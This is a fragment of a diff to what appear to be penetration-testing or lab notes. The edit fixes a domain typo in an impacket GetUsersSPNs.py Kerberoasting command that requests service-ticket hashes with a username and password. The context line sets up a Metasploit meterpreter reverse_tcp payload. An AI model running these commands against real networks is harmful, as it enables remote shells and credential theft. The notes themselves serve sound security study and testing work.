@@ -85,7 +85,7 @@ set payload /windows/x64/meterpreter/reverse_tcp set lhost eth0 run
 
   
 ```
-/opt/impacket/examples# GetUsersSPNs.py Carbon.loca/e.triage:'Password!1' -dc-ip <ip-DC> -request -outputfile hashes.kerbroast
+/opt/impacket/examples# GetUsersSPNs.py Carbon.local/e.triage:'Password!1' -dc-ip <ip-DC> -request -outputfile hashes.kerbroast
 ```
 
 ```
